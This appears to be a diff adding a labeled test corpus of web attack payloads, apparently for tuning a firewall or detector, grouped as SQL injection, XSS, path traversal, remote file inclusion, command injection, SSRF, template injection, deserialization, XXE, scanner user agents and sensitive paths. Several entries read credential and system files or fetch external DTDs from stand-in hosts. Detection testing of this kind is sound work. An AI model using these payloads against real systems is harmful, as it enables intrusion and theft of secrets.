@@ -1,0 +1,480 @@
+sqli	args	acct'/**/||/**/'x'='x
+sqli	json	acct'/**/||/**/'x'='x
+sqli	form	acct'/**/||/**/'x'='x
+sqli	cookie	acct'/**/||/**/'x'='x
+sqli	args	q=7') oR ('a'='a
+sqli	json	q=7') oR ('a'='a
+sqli	form	q=7') oR ('a'='a
+sqli	cookie	q=7') oR ('a'='a
+sqli	args	x' /*!50000UNION*/ SeLeCt 1,2
+sqli	json	x' /*!50000UNION*/ SeLeCt 1,2
+sqli	form	x' /*!50000UNION*/ SeLeCt 1,2
+sqli	cookie	x' /*!50000UNION*/ SeLeCt 1,2
+sqli	args	1 AND 3 BETWEEN 2 AND 4
+sqli	json	1 AND 3 BETWEEN 2 AND 4
+sqli	form	1 AND 3 BETWEEN 2 AND 4
+sqli	cookie	1 AND 3 BETWEEN 2 AND 4
+sqli	args	0' OR 'z' LIKE 'z' -- 
+sqli	json	0' OR 'z' LIKE 'z' -- 
+sqli	form	0' OR 'z' LIKE 'z' -- 
+sqli	cookie	0' OR 'z' LIKE 'z' -- 
+sqli	args	1; SELECT pg_sleep(2)
+sqli	json	1; SELECT pg_sleep(2)
+sqli	form	1; SELECT pg_sleep(2)
+sqli	cookie	1; SELECT pg_sleep(2)
+sqli	args	x'/**/AnD/**/1/**/LIKE/**/1#
+sqli	json	x'/**/AnD/**/1/**/LIKE/**/1#
+sqli	form	x'/**/AnD/**/1/**/LIKE/**/1#
+sqli	cookie	x'/**/AnD/**/1/**/LIKE/**/1#
+sqli	args	name=' OR 2>1 /*
+sqli	json	name=' OR 2>1 /*
+sqli	form	name=' OR 2>1 /*
+sqli	cookie	name=' OR 2>1 /*
+sqli	args	id=1 UNION%0aSELECT current_user
+sqli	json	id=1 UNION%0aSELECT current_user
+sqli	form	id=1 UNION%0aSELECT current_user
+sqli	cookie	id=1 UNION%0aSELECT current_user
+sqli	args	1' HAVING 1=1 -- 
+sqli	json	1' HAVING 1=1 -- 
+sqli	form	1' HAVING 1=1 -- 
+sqli	cookie	1' HAVING 1=1 -- 
+xss	args	<svg><animate onbegin=alert(2) attributeName=x dur=1s>
+xss	json	<svg><animate onbegin=alert(2) attributeName=x dur=1s>
+xss	multipart	<svg><animate onbegin=alert(2) attributeName=x dur=1s>
+xss	cookie	<svg><animate onbegin=alert(2) attributeName=x dur=1s>
+xss	args	<details open ontoggle=confirm(2)>
+xss	json	<details open ontoggle=confirm(2)>
+xss	multipart	<details open ontoggle=confirm(2)>
+xss	cookie	<details open ontoggle=confirm(2)>
+xss	args	<math><mtext><img src=x onerror=alert(2)>
+xss	json	<math><mtext><img src=x onerror=alert(2)>
+xss	multipart	<math><mtext><img src=x onerror=alert(2)>
+xss	cookie	<math><mtext><img src=x onerror=alert(2)>
+xss	args	java&#x73;cript:confirm(2)
+xss	json	java&#x73;cript:confirm(2)
+xss	multipart	java&#x73;cript:confirm(2)
+xss	cookie	java&#x73;cript:confirm(2)
+xss	args	<a href="data:text/html;base64,PHNjcmlwdD4=">open</a>
+xss	json	<a href="data:text/html;base64,PHNjcmlwdD4=">open</a>
+xss	multipart	<a href="data:text/html;base64,PHNjcmlwdD4=">open</a>
+xss	cookie	<a href="data:text/html;base64,PHNjcmlwdD4=">open</a>
+xss	args	<iframe srcdoc="&lt;svg onload=alert(2)&gt;">
+xss	json	<iframe srcdoc="&lt;svg onload=alert(2)&gt;">
+xss	multipart	<iframe srcdoc="&lt;svg onload=alert(2)&gt;">
+xss	cookie	<iframe srcdoc="&lt;svg onload=alert(2)&gt;">
+xss	args	<video><source onerror=alert(2)>
+xss	json	<video><source onerror=alert(2)>
+xss	multipart	<video><source onerror=alert(2)>
+xss	cookie	<video><source onerror=alert(2)>
+xss	args	<input autofocus onfocus=confirm(2)>
+xss	json	<input autofocus onfocus=confirm(2)>
+xss	multipart	<input autofocus onfocus=confirm(2)>
+xss	cookie	<input autofocus onfocus=confirm(2)>
+xss	args	<svg><foreignObject><img src=x onerror=alert(2)></foreignObject></svg>
+xss	json	<svg><foreignObject><img src=x onerror=alert(2)></foreignObject></svg>
+xss	multipart	<svg><foreignObject><img src=x onerror=alert(2)></foreignObject></svg>
+xss	cookie	<svg><foreignObject><img src=x onerror=alert(2)></foreignObject></svg>
+xss	args	<object data="javascript:alert(2)">
+xss	json	<object data="javascript:alert(2)">
+xss	multipart	<object data="javascript:alert(2)">
+xss	cookie	<object data="javascript:alert(2)">
+traversal	args	%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+traversal	json	%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+traversal	form	%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+traversal	path	%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+traversal	args	%252e%252e%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts
+traversal	json	%252e%252e%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts
+traversal	form	%252e%252e%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts
+traversal	path	%252e%252e%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts
+traversal	args	..%c0%af..%c0%afetc%2fhosts
+traversal	json	..%c0%af..%c0%afetc%2fhosts
+traversal	form	..%c0%af..%c0%afetc%2fhosts
+traversal	path	..%c0%af..%c0%afetc%2fhosts
+traversal	args	....\\....\\Windows\\System32\\config\\SAM
+traversal	json	....\\....\\Windows\\System32\\config\\SAM
+traversal	form	....\\....\\Windows\\System32\\config\\SAM
+traversal	path	....\\....\\Windows\\System32\\config\\SAM
+traversal	args	/safe/%2e%2e/%2e%2e/var/log/secure
+traversal	json	/safe/%2e%2e/%2e%2e/var/log/secure
+traversal	form	/safe/%2e%2e/%2e%2e/var/log/secure
+traversal	path	/safe/%2e%2e/%2e%2e/var/log/secure
+traversal	args	file:%252f%252f%252fetc%252fshadow
+traversal	json	file:%252f%252f%252fetc%252fshadow
+traversal	form	file:%252f%252f%252fetc%252fshadow
+traversal	path	file:%252f%252f%252fetc%252fshadow
+traversal	args	%2e%2e%2f%2e%2e%2fproc%2fself%2fcmdline
+traversal	json	%2e%2e%2f%2e%2e%2fproc%2fself%2fcmdline
+traversal	form	%2e%2e%2f%2e%2e%2fproc%2fself%2fcmdline
+traversal	path	%2e%2e%2f%2e%2e%2fproc%2fself%2fcmdline
+traversal	args	C:%5c..%5c..%5cWindows%5cwin.ini
+traversal	json	C:%5c..%5c..%5cWindows%5cwin.ini
+traversal	form	C:%5c..%5c..%5cWindows%5cwin.ini
+traversal	path	C:%5c..%5c..%5cWindows%5cwin.ini
+traversal	args	%252e%252e%252fhome%252fapp%252f.ssh%252fauthorized_keys
+traversal	json	%252e%252e%252fhome%252fapp%252f.ssh%252fauthorized_keys
+traversal	form	%252e%252e%252fhome%252fapp%252f.ssh%252fauthorized_keys
+traversal	path	%252e%252e%252fhome%252fapp%252f.ssh%252fauthorized_keys
+traversal	args	..%2f..%2f..%2fopt%2fapp%2fconfig.yml
+traversal	json	..%2f..%2f..%2fopt%2fapp%2fconfig.yml
+traversal	form	..%2f..%2f..%2fopt%2fapp%2fconfig.yml
+traversal	path	..%2f..%2f..%2fopt%2fapp%2fconfig.yml
+rfi	args	https://cdn.attacker.invalid/view?module=../../shell
+rfi	json	https://cdn.attacker.invalid/view?module=../../shell
+rfi	multipart	https://cdn.attacker.invalid/view?module=../../shell
+rfi	form	https://cdn.attacker.invalid/view?module=../../shell
+rfi	args	http://203.0.113.9/loader.inc
+rfi	json	http://203.0.113.9/loader.inc
+rfi	multipart	http://203.0.113.9/loader.inc
+rfi	form	http://203.0.113.9/loader.inc
+rfi	args	ftp://files.invalid/releases/bootstrap.txt
+rfi	json	ftp://files.invalid/releases/bootstrap.txt
+rfi	multipart	ftp://files.invalid/releases/bootstrap.txt
+rfi	form	ftp://files.invalid/releases/bootstrap.txt
+rfi	args	php://filter/read=convert.base64-encode/resource=../../cfg
+rfi	json	php://filter/read=convert.base64-encode/resource=../../cfg
+rfi	multipart	php://filter/read=convert.base64-encode/resource=../../cfg
+rfi	form	php://filter/read=convert.base64-encode/resource=../../cfg
+rfi	args	data://text/plain,<?php echo 1 ?>
+rfi	json	data://text/plain,<?php echo 1 ?>
+rfi	multipart	data://text/plain,<?php echo 1 ?>
+rfi	form	data://text/plain,<?php echo 1 ?>
+rfi	args	expect://id
+rfi	json	expect://id
+rfi	multipart	expect://id
+rfi	form	expect://id
+rfi	args	phar://uploads/archive.phar/index.php
+rfi	json	phar://uploads/archive.phar/index.php
+rfi	multipart	phar://uploads/archive.phar/index.php
+rfi	form	phar://uploads/archive.phar/index.php
+rfi	args	http%3A%2F%2F198.51.100.7%2Fentry
+rfi	json	http%3A%2F%2F198.51.100.7%2Fentry
+rfi	multipart	http%3A%2F%2F198.51.100.7%2Fentry
+rfi	form	http%3A%2F%2F198.51.100.7%2Fentry
+rfi	args	include=https://mirror.invalid/lib/init
+rfi	json	include=https://mirror.invalid/lib/init
+rfi	multipart	include=https://mirror.invalid/lib/init
+rfi	form	include=https://mirror.invalid/lib/init
+rfi	args	https://assets.invalid/static/../../include
+rfi	json	https://assets.invalid/static/../../include
+rfi	multipart	https://assets.invalid/static/../../include
+rfi	form	https://assets.invalid/static/../../include
+rce	args	x; printf ready
+rce	json	x; printf ready
+rce	multipart	x; printf ready
+rce	cookie	x; printf ready
+rce	args	x%0a/usr/bin/id
+rce	json	x%0a/usr/bin/id
+rce	multipart	x%0a/usr/bin/id
+rce	cookie	x%0a/usr/bin/id
+rce	args	x && python3 -c 'print(1)'
+rce	json	x && python3 -c 'print(1)'
+rce	multipart	x && python3 -c 'print(1)'
+rce	cookie	x && python3 -c 'print(1)'
+rce	args	x|${IFS}sh
+rce	json	x|${IFS}sh
+rce	multipart	x|${IFS}sh
+rce	cookie	x|${IFS}sh
+rce	args	x; env
+rce	json	x; env
+rce	multipart	x; env
+rce	cookie	x; env
+rce	args	x; printf ok
+rce	json	x; printf ok
+rce	multipart	x; printf ok
+rce	cookie	x; printf ok
+rce	args	x$(/usr/bin/id)
+rce	json	x$(/usr/bin/id)
+rce	multipart	x$(/usr/bin/id)
+rce	cookie	x$(/usr/bin/id)
+rce	args	x; perl -e 'print 1'
+rce	json	x; perl -e 'print 1'
+rce	multipart	x; perl -e 'print 1'
+rce	cookie	x; perl -e 'print 1'
+rce	args	x%3b%0auname%20-a
+rce	json	x%3b%0auname%20-a
+rce	multipart	x%3b%0auname%20-a
+rce	cookie	x%3b%0auname%20-a
+rce	args	x||busybox%20id
+rce	json	x||busybox%20id
+rce	multipart	x||busybox%20id
+rce	cookie	x||busybox%20id
+ssrf	args	http://[::1]:8080/admin
+ssrf	json	http://[::1]:8080/admin
+ssrf	multipart	http://[::1]:8080/admin
+ssrf	form	http://[::1]:8080/admin
+ssrf	args	http://0177.0.0.1/private
+ssrf	json	http://0177.0.0.1/private
+ssrf	multipart	http://0177.0.0.1/private
+ssrf	form	http://0177.0.0.1/private
+ssrf	args	http://2130706433/metadata
+ssrf	json	http://2130706433/metadata
+ssrf	multipart	http://2130706433/metadata
+ssrf	form	http://2130706433/metadata
+ssrf	args	http://0x7f000001/config
+ssrf	json	http://0x7f000001/config
+ssrf	multipart	http://0x7f000001/config
+ssrf	form	http://0x7f000001/config
+ssrf	args	http://169.254.169.254.nip.io/latest/meta-data/
+ssrf	json	http://169.254.169.254.nip.io/latest/meta-data/
+ssrf	multipart	http://169.254.169.254.nip.io/latest/meta-data/
+ssrf	form	http://169.254.169.254.nip.io/latest/meta-data/
+ssrf	args	http://metadata.google.internal/computeMetadata/v1/
+ssrf	json	http://metadata.google.internal/computeMetadata/v1/
+ssrf	multipart	http://metadata.google.internal/computeMetadata/v1/
+ssrf	form	http://metadata.google.internal/computeMetadata/v1/
+ssrf	args	http://100.64.0.1/internal
+ssrf	json	http://100.64.0.1/internal
+ssrf	multipart	http://100.64.0.1/internal
+ssrf	form	http://100.64.0.1/internal
+ssrf	args	http://172.30.1.5:9000/secret
+ssrf	json	http://172.30.1.5:9000/secret
+ssrf	multipart	http://172.30.1.5:9000/secret
+ssrf	form	http://172.30.1.5:9000/secret
+ssrf	args	http://192.168.44.2/private
+ssrf	json	http://192.168.44.2/private
+ssrf	multipart	http://192.168.44.2/private
+ssrf	form	http://192.168.44.2/private
+ssrf	args	http://10.7.8.9/api/internal
+ssrf	json	http://10.7.8.9/api/internal
+ssrf	multipart	http://10.7.8.9/api/internal
+ssrf	form	http://10.7.8.9/api/internal
+ssti	args	{% print(7*7) %}
+ssti	json	{% print(7*7) %}
+ssti	multipart	{% print(7*7) %}
+ssti	cookie	{% print(7*7) %}
+ssti	args	#{7*7}
+ssti	json	#{7*7}
+ssti	multipart	#{7*7}
+ssti	cookie	#{7*7}
+ssti	args	<#assign x=7*7>${x}
+ssti	json	<#assign x=7*7>${x}
+ssti	multipart	<#assign x=7*7>${x}
+ssti	cookie	<#assign x=7*7>${x}
+ssti	args	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	json	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	multipart	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	cookie	${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	args	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	json	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	multipart	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	cookie	{{ cycler.__init__.__globals__.os.popen('id').read() }}
+ssti	args	{{ request|attr('application') }}
+ssti	json	{{ request|attr('application') }}
+ssti	multipart	{{ request|attr('application') }}
+ssti	cookie	{{ request|attr('application') }}
+ssti	args	${{3*'7'}}
+ssti	json	${{3*'7'}}
+ssti	multipart	${{3*'7'}}
+ssti	cookie	${{3*'7'}}
+ssti	args	{{ config.__class__.__init__.__globals__ }}
+ssti	json	{{ config.__class__.__init__.__globals__ }}
+ssti	multipart	{{ config.__class__.__init__.__globals__ }}
+ssti	cookie	{{ config.__class__.__init__.__globals__ }}
+ssti	args	#{1+1}
+ssti	json	#{1+1}
+ssti	multipart	#{1+1}
+ssti	cookie	#{1+1}
+ssti	args	{% set x = [].__class__ %}{{x}}
+ssti	json	{% set x = [].__class__ %}{{x}}
+ssti	multipart	{% set x = [].__class__ %}{{x}}
+ssti	cookie	{% set x = [].__class__ %}{{x}}
+deserialization	args	O:8:"stdClass":0:{}
+deserialization	json	O:8:"stdClass":0:{}
+deserialization	multipart	O:8:"stdClass":0:{}
+deserialization	form	O:8:"stdClass":0:{}
+deserialization	args	a:1:{s:4:"name";s:3:"bob";}
+deserialization	json	a:1:{s:4:"name";s:3:"bob";}
+deserialization	multipart	a:1:{s:4:"name";s:3:"bob";}
+deserialization	form	a:1:{s:4:"name";s:3:"bob";}
+deserialization	args	rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+deserialization	json	rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+deserialization	multipart	rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+deserialization	form	rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+deserialization	args	gASVFAAAAAAAAACMCGJ1aWx0aW5zlIwEc2V0lJOU
+deserialization	json	gASVFAAAAAAAAACMCGJ1aWx0aW5zlIwEc2V0lJOU
+deserialization	multipart	gASVFAAAAAAAAACMCGJ1aWx0aW5zlIwEc2V0lJOU
+deserialization	form	gASVFAAAAAAAAACMCGJ1aWx0aW5zlIwEc2V0lJOU
+deserialization	args	{"$type":"System.IO.FileInfo, mscorlib"}
+deserialization	json	{"$type":"System.IO.FileInfo, mscorlib"}
+deserialization	multipart	{"$type":"System.IO.FileInfo, mscorlib"}
+deserialization	form	{"$type":"System.IO.FileInfo, mscorlib"}
+deserialization	args	YToyOntzOjQ6Im5hbWUiO3M6MToieCI7fQ==
+deserialization	json	YToyOntzOjQ6Im5hbWUiO3M6MToieCI7fQ==
+deserialization	multipart	YToyOntzOjQ6Im5hbWUiO3M6MToieCI7fQ==
+deserialization	form	YToyOntzOjQ6Im5hbWUiO3M6MToieCI7fQ==
+deserialization	args	java.beans.XMLDecoder
+deserialization	json	java.beans.XMLDecoder
+deserialization	multipart	java.beans.XMLDecoder
+deserialization	form	java.beans.XMLDecoder
+deserialization	args	org.apache.commons.collections.functors.InvokerTransformer
+deserialization	json	org.apache.commons.collections.functors.InvokerTransformer
+deserialization	multipart	org.apache.commons.collections.functors.InvokerTransformer
+deserialization	form	org.apache.commons.collections.functors.InvokerTransformer
+deserialization	args	!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader []]
+deserialization	json	!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader []]
+deserialization	multipart	!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader []]
+deserialization	form	!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader []]
+deserialization	args	aced00057372000a
+deserialization	json	aced00057372000a
+deserialization	multipart	aced00057372000a
+deserialization	form	aced00057372000a
+scanner	ua	Mozilla/5.0 (compatible; WPScan/3.8; +https://wpscan.com)
+scanner	ua	Mozilla/5.0 (compatible; WPScan/3.8; +https://wpscan.com)
+scanner	ua	Mozilla/5.0 (compatible; WPScan/3.8; +https://wpscan.com)
+scanner	ua	Mozilla/5.0 (compatible; WPScan/3.8; +https://wpscan.com)
+scanner	ua	Arachni/v1
+scanner	ua	Arachni/v1
+scanner	ua	Arachni/v1
+scanner	ua	Arachni/v1
+scanner	ua	OWASP ZAP/2.15
+scanner	ua	OWASP ZAP/2.15
+scanner	ua	OWASP ZAP/2.15
+scanner	ua	OWASP ZAP/2.15
+scanner	ua	Wfuzz/3.1
+scanner	ua	Wfuzz/3.1
+scanner	ua	Wfuzz/3.1
+scanner	ua	Wfuzz/3.1
+scanner	ua	ffuf/2.1
+scanner	ua	ffuf/2.1
+scanner	ua	ffuf/2.1
+scanner	ua	ffuf/2.1
+scanner	ua	feroxbuster/2
+scanner	ua	feroxbuster/2
+scanner	ua	feroxbuster/2
+scanner	ua	feroxbuster/2
+scanner	ua	gospider/1.1
+scanner	ua	gospider/1.1
+scanner	ua	gospider/1.1
+scanner	ua	gospider/1.1
+scanner	ua	whatweb/0.6
+scanner	ua	whatweb/0.6
+scanner	ua	whatweb/0.6
+scanner	ua	whatweb/0.6
+scanner	ua	Burp Suite Scanner
+scanner	ua	Burp Suite Scanner
+scanner	ua	Burp Suite Scanner
+scanner	ua	Burp Suite Scanner
+scanner	ua	OpenVAS Security Scanner
+scanner	ua	OpenVAS Security Scanner
+scanner	ua	OpenVAS Security Scanner
+scanner	ua	OpenVAS Security Scanner
+sensitive	path	/.hg/store/00manifest.i
+sensitive	path	/.hg/store/00manifest.i
+sensitive	path	/.hg/store/00manifest.i
+sensitive	path	/.hg/store/00manifest.i
+sensitive	path	/server-status
+sensitive	path	/server-status
+sensitive	path	/server-status
+sensitive	path	/server-status
+sensitive	path	/actuator/env
+sensitive	path	/actuator/env
+sensitive	path	/actuator/env
+sensitive	path	/actuator/env
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/debug/vars
+sensitive	path	/config.php.save
+sensitive	path	/config.php.save
+sensitive	path	/config.php.save
+sensitive	path	/config.php.save
+sensitive	path	/backup/database.sql.gz
+sensitive	path	/backup/database.sql.gz
+sensitive	path	/backup/database.sql.gz
+sensitive	path	/backup/database.sql.gz
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/.docker/config.json
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/terraform.tfstate.backup
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/id_ed25519
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+sensitive	path	/.npmrc
+xxe	xml	<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://outside.invalid/ext.dtd'>%p;]><r/>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://outside.invalid/ext.dtd'>%p;]><r/>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://outside.invalid/ext.dtd'>%p;]><r/>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://outside.invalid/ext.dtd'>%p;]><r/>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///proc/self/environ'>]><r>&x;</r>
+xxe	xml	<!DOCTYPE r SYSTEM 'https://outside.invalid/remote.dtd'><r/>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM 'https://outside.invalid/remote.dtd'><r/>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r SYSTEM 'https://outside.invalid/remote.dtd'><r/>
+xxe	xml	\n<!DOCTYPE r SYSTEM 'https://outside.invalid/remote.dtd'><r/>
+xxe	xml	<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><svg>&x;</svg>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><svg>&x;</svg>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><svg>&x;</svg>
+xxe	xml	\n<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><svg>&x;</svg>
+xxe	xml	<!DOCTYPE r [<!ENTITY % a '<!ENTITY x SYSTEM "file:///etc/passwd">'>%a;]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % a '<!ENTITY x SYSTEM "file:///etc/passwd">'>%a;]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY % a '<!ENTITY x SYSTEM "file:///etc/passwd">'>%a;]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY % a '<!ENTITY x SYSTEM "file:///etc/passwd">'>%a;]><r>&x;</r>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///root/.ssh/id_rsa'>]><r>&x;</r>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'http://127.0.0.1:8080/'>]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://127.0.0.1:8080/'>]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://127.0.0.1:8080/'>]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://127.0.0.1:8080/'>]><r>&x;</r>
+xxe	xml	<!DOCTYPE r [<!ENTITY % ext SYSTEM 'https://outside.invalid/p.dtd'>%ext;]><r/>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % ext SYSTEM 'https://outside.invalid/p.dtd'>%ext;]><r/>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY % ext SYSTEM 'https://outside.invalid/p.dtd'>%ext;]><r/>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY % ext SYSTEM 'https://outside.invalid/p.dtd'>%ext;]><r/>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///var/log/auth.log'>]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///var/log/auth.log'>]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///var/log/auth.log'>]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///var/log/auth.log'>]><r>&x;</r>
+xxe	xml	<!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/'>]><r>&x;</r>
+xxe	xml	<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/'>]><r>&x;</r>
+xxe	xml	<!-- request payload -->\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/'>]><r>&x;</r>
+xxe	xml	\n<!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/'>]><r>&x;</r>
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=BREW
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=M-SEARCH
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=PROPFIND
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=TRACK
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=DEBUG
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=FROB
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=PRI
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=SEARCH
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=COPY
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
+protocol	protocol	missing_host
+protocol	protocol	unusual_method=LINK
+protocol	protocol	content_length_transfer_encoding
+protocol	protocol	duplicate_content_length
